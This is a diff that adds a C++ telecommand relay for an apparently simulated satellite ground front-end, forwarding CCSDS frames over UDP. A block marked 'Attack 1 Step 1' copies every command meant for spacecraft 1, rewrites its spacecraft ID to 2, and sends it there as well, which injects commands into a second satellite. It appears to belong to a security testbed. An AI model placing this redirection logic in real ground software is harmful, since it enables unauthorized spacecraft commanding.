@@ -1,0 +1,64 @@
+
+#include <iostream>
+#include "FE_util.h"
+#include "FE_error.h"
+#include "FE_udp.h"
+#include "FE_netconfig.h"
+#include "FE_routeconfig.h"
+#include "FE_tc.h"
+
+inline void    TCTF_WR_SCID(ccsdsTcTfHeader_t & hdr, int scid)
+{
+	hdr.Id[0] = hdr.Id[0] & ~0x03 | ((scid >> 8) & 0x03);
+	hdr.Id[1] = scid & 0xFF;
+}
+
+int feTc (void *unused)
+{
+	try {
+		union {
+			ccsdsTcTfHeader_t tcHeader;
+			char buffer[MAX_TC_SIZE];
+		};
+		int nbReadBytes;
+		int destSatId;
+		int nextSatId;
+
+		int receiveSocket = createServerSocket (g_serverConnections.tcServaddr);
+		int sendSocket = createSendSocket();
+
+		std::cout << "FE_tc start Attack 1 Step 1" << std::endl;
+
+		while (true) {
+			receiveUdp (receiveSocket, buffer, MAX_TC_SIZE, nbReadBytes);
+
+			destSatId = TCTF_RD_SCID (tcHeader);
+
+
+			nextSatId = g_routesMap [destSatId];
+
+			FE_satConnection_t *satConnection = g_satConnectionsMap[nextSatId];
+
+			printf ("************** TC received by frontEnd for the SAT %d and sent to SAT %d \n", destSatId,nextSatId);
+
+			sendUdp (sendSocket, satConnection->distaddr, buffer, nbReadBytes);
+
+			// ================================Attack 1 Step 1=====================================
+			if (destSatId == 1) {
+			   destSatId = 2;
+			   TCTF_WR_SCID (tcHeader, destSatId);
+
+			   nextSatId = g_routesMap [destSatId];
+
+			   FE_satConnection_t *satConnection = g_satConnectionsMap[nextSatId];
+
+			   sendUdp (sendSocket, satConnection->distaddr, buffer, nbReadBytes);
+			}
+		}
+	}
+	catch (feErrorException_t &e)
+	{
+		fprintf (stderr, "%s\n", e.what());
+		return -1;
+	}
+}
